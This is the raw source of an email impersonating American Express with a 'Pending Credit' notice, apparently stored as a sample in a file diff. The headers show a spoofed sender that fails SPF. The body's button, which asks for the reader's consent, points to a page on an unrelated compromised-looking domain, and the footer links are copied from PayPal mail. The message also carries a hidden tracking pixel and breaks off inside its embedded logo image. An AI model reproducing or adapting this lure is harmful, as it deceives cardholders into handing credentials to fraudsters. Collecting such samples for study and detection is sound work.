@@ -1,0 +1,369 @@
+Return-Path: <Uservice@interus.com>
+Received: from interus.com ([85.234.13.222])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id l0ho7up6l1f8p433779ck8gm77c7j0d3j99cts01
+ for zingerpie@kfcreview.com;
+ Fri, 10 Apr 2026 15:01:02 +0000 (UTC)
+Received-SPF: fail (spfCheck: domain of interus.com does not designate 85.234.13.222 as permitted sender) client-ip=85.234.13.222; envelope-from=Uservice@interus.com; helo=interus.com;
+Authentication-Results: amazonses.com;
+ spf=fail (spfCheck: domain of interus.com does not designate 85.234.13.222 as permitted sender) client-ip=85.234.13.222; envelope-from=Uservice@interus.com; helo=interus.com;
+ dmarc=none header.from=interus.com;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFFcU45ajd1UGMvcHZDUlN0dklOd3R6cFhVbUMxcjFMemRMdUd4S1Yyc1lQRTE1dWFRa0JQSFp6OTFxRzJBd24zNk1JTE92ZE9hRHVJZWUzT1pHMGhFVEpHdjlWWlFVaGN1VldhSXNQOHFsc2VYTDRHWVg3NlI0QXV4cG5tSzBsdFpmSjJaVGpycUVYYTB4c0c0dU9Cd3BRYlVxZXpIc1IxQXREL3VqUUtMSUVleitmOEVxaTFnOXJXRUdtTDVHNEVIN3djVHNEdVZKbnh4SUJCNlVWM1hMeE5mT2JvQnlxWVNYV3ZFT1RXaVdVZFJtaFpwR3krV21tQ1VWaDVNekN2cWxRcG5nUy9Xb09Fc1JscWxSYS9qVXBQUzRweHgwam5Jd1Z2RkRrWHhDdnc9PQ==
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=5K8MUDXTKaW+xlhDwuf94ar+47kk0pr9FBmMN5n4uF2BHmNyZMSHsFR75/48hOxGNk5En4k91c+ifGiO/cIanlAeIRssZoEriywFKzEKaB1CijiRYQIxVROx+aFzkgdIqOYUsTXAtO392JEQRdY82NY5nnUpgV5HtK3AWaboXm0=; c=relaxed/simple; s=ndjes4mrtuzus6qxu3frw3ubo3gpjndv; d=amazonses.com; t=1775833263; v=1; bh=JpK4vIdtiingPhoyMPwE51M4FV6W8MYpFjTz692IItY=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "American Express" <Uservice@interus.com>
+To: zingerpie@kfcreview.com
+Subject: Pending Credit
+Date: 10 Apr 2026 18:00:39 +0300
+Message-ID: <20260410180039.7429CCCB55C3C996@interus.com>
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	boundary="----=_NextPart_000_0012_878858FC.6093DAB8"
+
+
+------=_NextPart_000_0012_878858FC.6093DAB8
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD><TITLE>newwwww</TITLE>
+<META content=3D"text/html; charset=3DUTF-8" http-equiv=3Dcontent-type>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<TABLE style=3D"FONT-FAMILY: arial,sans-serif; WORD-SPACING: 0px; TEXT-TRAN=
+SFORM: none; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0p=
+x" cellSpacing=3D0 cellPadding=3D1 width=3D"100%" bgColor=3D#efefef border=
+=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" colSpan=3D2><B=
+R></TD></TR>
+<TR bgColor=3D#ffffff>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" colSpan=3D2>
+<DIV class=3Dmsg style=3D"PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-=
+LEFT: 10px; PADDING-RIGHT: 10px">
+<DIV style=3D"BACKGROUND: rgb(242,242,242) 0% 50%; PADDING-BOTTOM: 0px; PAD=
+DING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; -moz-bac=
+kground-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-back=
+ground-inline-policy: -moz-initial">
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 0px; FONT-FAMILY: arial,sans-serif" bgColor=3D#f2f2=
+f2>&nbsp;</TD>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" bgColor=3D#fff=
+fff width=3D660 align=3Dcenter>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D600 align=3Dcenter>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif; PADDING-TOP: 1=
+0px" bgColor=3D#f2f2f2><BR></TD></TR>
+<TR>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif; PADDING-TOP: 1=
+0px" bgColor=3D#f2f2f2><BR></TD></TR>
+<TR>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" bgColor=3D#fff=
+fff vAlign=3Dtop align=3Dcenter>
+<TABLE style=3D"MARGIN-BOTTOM: 10px" cellSpacing=3D0 cellPadding=3D0 width=
+=3D"100%" border=3D0>
+<TBODY>
+<TR vAlign=3Dbottom>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D20 align=3Dcenter>&nbsp;</TD>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" height=3D64 al=
+ign=3Dleft><img id=3D"dimg_Bi_Yac2aPN7Tp84PtaaywAo_221" class=3D"YQ4gaf" st=
+yle=3D"HEIGHT: 126px; WIDTH: 233px; object-position: 25% 47%" alt=3D"Americ=
+an Express grants boost historic ..." src=3D"cid:images" width=3D"300" heig=
+ht=3D"168" data-iml=3D"1775775501549" data-deferred=3D"3" data-atf=3D"4" da=
+ta-csiid=3D"Bi_Yac2aPN7Tp84PtaaywAo_93"></TD>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D20 align=3Dcenter>&nbsp;</TD></TR></TBODY></TABLE>
+<TABLE style=3D"PADDING-BOTTOM: 10px; PADDING-TOP: 10px" cellSpacing=3D0 ce=
+llPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR vAlign=3Dbottom>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D20 align=3Dcenter>&nbsp;</TD>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif"><SPAN style=3D=
+'FONT-SIZE: 36px; FONT-FAMILY: Calibri,Trebuchet,Arial,"sans serif"; COLOR:=
+ rgb(0,121,193); LINE-HEIGHT: 44px'>Pending Credit<BR></SPAN></TD>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D20 align=3Dcenter>&nbsp;</TD></TR></TBODY></TABLE>
+<TABLE style=3D"MARGIN-BOTTOM: 20px; PADDING-BOTTOM: 10px; PADDING-TOP: 10p=
+x" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR vAlign=3Dbottom>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D20 align=3Dcenter>&nbsp;<BR></TD>
+<TD style=3D'FONT-SIZE: 15px; FONT-FAMILY: Calibri,Trebuchet,Arial,"sans se=
+rif"; COLOR: rgb(51,51,51); LINE-HEIGHT: 22px' vAlign=3Dtop>
+<P>zingerpie@kfcreview.com,<SPAN>&nbsp;<BR><BR>
+<SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: Calibri, Trebuchet, Arial, "sa=
+ns serif"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FL=
+OAT: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPH=
+ANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACK=
+GROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: n=
+ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-deco=
+ration-style: initial; text-decoration-color:=20
+initial'>This email is to notify you about the pending&nbsp;credit on your =
+American Express account.</SPAN> <BR><BR>
+<SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: Calibri, Trebuchet, Arial, "sa=
+ns serif"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FL=
+OAT: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPH=
+ANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACK=
+GROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: n=
+ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-deco=
+ration-style: initial; text-decoration-color:=20
+initial'>Your&nbsp;consent is required for aprroval.<BR><BR>
+<TABLE class=3Dv1hb-hero-button style=3D"BOX-SIZING: border-box; BORDER-COL=
+LAPSE: collapse; border-radius: 3px" height=3D38 cellSpacing=3D0 cellPaddin=
+g=3D0 width=3D228 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Helvetic=
+aNeue, "Helvetica Neue", Helvetica, Arial, sans-serif; BORDER-COLLAPSE: col=
+lapse; COLOR: rgb(255,255,255); border-radius: 3px' bgColor=3D#006fcf heigh=
+t=3D38 vAlign=3Dmiddle align=3Dcenter>
+<A class=3Dv1hb-hero-button style=3D'BOX-SIZING: border-box; TEXT-DECORATIO=
+N: none; BORDER-TOP: rgb(0,111,207) 1px solid; FONT-FAMILY: HelveticaNeue, =
+"Helvetica Neue", Helvetica, Arial, sans-serif; BORDER-RIGHT: rgb(0,111,207=
+) 1px solid; WIDTH: 228px; BORDER-BOTTOM: rgb(0,111,207) 1px solid; TEXT-TR=
+ANSFORM: none; FONT-WEIGHT: normal; COLOR: rgb(255,255,255); PADDING-BOTTOM=
+: 8px; PADDING-TOP: 8px; PADDING-LEFT: 0px; BORDER-LEFT: rgb(0,111,207) 1px=
+ solid; DISPLAY: inline-block; LINE-HEIGHT: 22px;=20
+PADDING-RIGHT: 0px; BACKGROUND-COLOR: transparent; border-radius: 3px' href=
+=3D"https://asfc.de/wp-includes/wx.htm" rel=3Dnoreferrer target=3D_blank>&n=
+bsp;Pending Credit</A></TD></TR></TBODY></TABLE><BR></SPAN></SPAN></P>
+<P>Thank you for choosing American Express.</P>
+<P>American Express<BR></P><SPAN style=3D"FONT-WEIGHT: bold; COLOR: rgb(68,=
+68,68)"></SPAN><SPAN></SPAN></TD>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D20 align=3Dcenter>&nbsp;</TD></TR></TBODY></TABLE></TD></TR></TBODY>=
+</TABLE></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D600 align=3Dcenter>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif; PADDING-TOP: 2=
+0px" bgColor=3D#f2f2f2><BR></TD></TR>
+<TR>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" bgColor=3D#f2f=
+2f2 vAlign=3Dtop align=3Dcenter>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR vAlign=3Dbottom>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D20 align=3Dcenter>&nbsp;</TD>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif">
+<TABLE cellSpacing=3D0 cellPadding=3D0 align=3Dleft border=3D0>
+<TBODY>
+<TR>
+<TD style=3D'FONT-SIZE: 13px; FONT-FAMILY: Calibri,Trebuchet,Arial,"sans se=
+rif"; FONT-WEIGHT: bold; COLOR: rgb(102,102,102)'><SPAN>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 5px 0px; PADDING-RIGHT: 0px"><SPAN style=3D"DISPLAY: inline"><SPAN>
+<A style=3D"TEXT-DECORATION: none; COLOR: rgb(0,0,204)" href=3D"#" rel=3Dno=
+referrer target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?hl=3Dfr&amp;q=3Dhttps://=
+www.google.com/url?q%3Dhttps%253A%252F%252Fwww.paypal.com%252Fselfhelp%252F=
+home%253Futm_source%253Dunp%2526utm_medium%253Demail%2526utm_campaign%253DP=
+PX001529%2526utm_unptid%253D5b0975c0-639e-11e9-992a-024202944cba%2526ppid%2=
+53DPPX001529%2526cnac%253DUS%2526rsta%253Den_CA%2526cust%253D%2526unptid%25=
+3D5b0975c0-639e-11e9-992a-024202944cba%2526calc%253D4f8aad33b2d87%2526unp_t=
+pcid%253Daccount-recovery_notification%2526page%253Dmain
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;%253Aemail%253APPX001529%253A%253A%253A%=
+2526pgrp%253Dmain%253Aemail%2526e%253Dcl%2526mchn%253Dem%2526s%253Dci%2526m=
+ail%253Dsys%26sa%3DD%26sntz%3D1%26usg%3DAFQjCNGbdZWpYkuhMTLMlWdvpdWuVumC7A&=
+amp;source=3Dgmail&amp;ust=3D1555938910635000&amp;usg=3D
+AFQjCNE04M&#13;&#10;hgay-n7W7w&#13;&#10;BHd0OZ8c_u&#13;&#10;X_mw">Help&nbsp=
+;</A> <SPAN>&nbsp;</SPAN> </SPAN><SPAN style=3D"COLOR: rgb(204,204,204)"><S=
+PAN>|<SPAN> &nbsp;</SPAN> </SPAN></SPAN><SPAN>
+<A style=3D"TEXT-DECORATION: none; COLOR: rgb(0,0,204)" href=3D"#" rel=3Dno=
+referrer target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?hl=3Dfr&amp;q=3Dhttps://=
+www.google.com/url?q%3Dhttps%253A%252F%252Fwww.paypal.com%252Fsecurity%253F=
+utm_source%253Dunp%2526utm_medium%253Demail%2526utm_campaign%253DPPX001529%=
+2526utm_unptid%253D5b0975c0-639e-11e9-992a-024202944cba%2526ppid%253DPPX001=
+529%2526cnac%253DUS%2526rsta%253Den_CA%2526cust%253D%2526unptid%253D5b0975c=
+0-639e-11e9-992a-024202944cba%2526calc%253D4f8aad33b2d87%2526unp_tpcid%253D=
+account-recovery_notification%2526page%253Dmain%253Aemai
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;l%253APPX001529%253A%253A%253A%2526pgrp%=
+253Dmain%253Aemail%2526e%253Dcl%2526mchn%253Dem%2526s%253Dci%2526mail%253Ds=
+ys%26sa%3DD%26sntz%3D1%26usg%3DAFQjCNH0w-x7o2isrzDlPgVHjJC7ahtRZQ&amp;sourc=
+e=3Dgmail&amp;ust=3D1555938910635000&amp;usg=3DAFQjCNHAx
+FFRZ-yUWhY&#13;&#10;g7WM7MQb6_&#13;&#10;K1Kew">Security Centre&nbsp;</A></S=
+PAN> </SPAN></DIV></SPAN></TD></TR></TBODY></TABLE></TD>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D20 align=3Dcenter>&nbsp;</TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR vAlign=3Dbottom>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D20 align=3Dcenter>&nbsp;</TD>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif">
+<P>Please do not reply to this email. To get in touch with us, click<SPAN>&=
+nbsp;</SPAN><STRONG>
+ <A style=3D"TEXT-DECORATION: none; COLOR: rgb(0,0,204)" href=3D"#" rel=3Dn=
+oreferrer target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?hl=3Dfr&amp;q=3Dhttps://=
+www.google.com/url?q%3Dhttps%253A%252F%252Fwww.paypal.com%252Fselfhelp%252F=
+home%253Futm_source%253Dunp%2526utm_medium%253Demail%2526utm_campaign%253DP=
+PX001529%2526utm_unptid%253D5b0975c0-639e-11e9-992a-024202944cba%2526ppid%2=
+53DPPX001529%2526cnac%253DUS%2526rsta%253Den_CA%2526cust%253D%2526unptid%25=
+3D5b0975c0-639e-11e9-992a-024202944cba%2526calc%253D4f8aad33b2d87%2526unp_t=
+pcid%253Daccount-recovery_notification%2526page%253Dmain
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;%253Aemail%253APPX001529%253A%253A%253A%=
+2526pgrp%253Dmain%253Aemail%2526e%253Dcl%2526mchn%253Dem%2526s%253Dci%2526m=
+ail%253Dsys%26sa%3DD%26sntz%3D1%26usg%3DAFQjCNGbdZWpYkuhMTLMlWdvpdWuVumC7A&=
+amp;source=3Dgmail&amp;ust=3D1555938910635000&amp;usg=3D
+AFQjCNE04M&#13;&#10;hgay-n7W7w&#13;&#10;BHd0OZ8c_u&#13;&#10;X_mw">Help &amp=
+; Contact</A> </STRONG>.</P></TD>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D20 align=3Dcenter>&nbsp;</TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR vAlign=3Dbottom>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D20 align=3Dcenter>&nbsp;</TD>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif"><SPAN>
+<TABLE style=3D"COLOR: rgb(41,41,41); PADDING-TOP: 20px; FONT: 12px Arial,V=
+erdana,Helvetica,sans-serif; font-size-adjust: none; font-stretch: normal" =
+cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 9px; FONT-FAMILY: arial,sans-serif">Copyright 0 8 1=
+999-2026 American Express, Inc. All rights reserved.&nbsp;American Express.=
+=20
+<P>American Express&nbsp;PPX001529:N/A:4f8aad31b2d87</P></TD></TR></TBODY><=
+/TABLE>
+<img style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; BORDE=
+R-LEFT: 0px" border=3D"0" alt src=3D"cid:ts" width=3D"1" height=3D"1"></SPA=
+N></TD>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" vAlign=3Dtop w=
+idth=3D20 align=3Dcenter>&nbsp;</TD></TR></TBODY></TABLE></TD></TR></TBODY>=
+</TABLE></TD></TR></TBODY></TABLE></TD>
+<TD style=3D"FONT-SIZE: 0px; FONT-FAMILY: arial,sans-serif" bgColor=3D#f2f2=
+f2>&nbsp;</TD></TR></TBODY></TABLE></DIV></DIV></TD></TR></TBODY></TABLE><A=
+ style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif; WHITE-SPACE: norm=
+al; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0=
+,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; B=
+ACKGROUND-COLOR: rgb(204,204,204); TEXT-INDENT: 0px" name=3Dm_></A>
+<TABLE class=3Dqr style=3D"FONT-FAMILY: arial,sans-serif; WORD-SPACING: 0px=
+; TEXT-TRANSFORM: none; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT=
+-INDENT: 0px" cellSpacing=3D0 cellPadding=3D1 width=3D"100%" bgColor=3D#e0e=
+cff border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" bgColor=3D#c3d=
+9ff><BR></TD></TR>
+<TR>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif">
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"1%" bgColor=3D#e0ecff borde=
+r=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial,sans-serif" colSpan=3D2><B=
+R></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></BODY></HTML>
+------=_NextPart_000_0012_878858FC.6093DAB8
+Content-Type: application/octet-stream; name="images"
+Content-Transfer-Encoding: base64
+Content-ID: <images>
+
+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
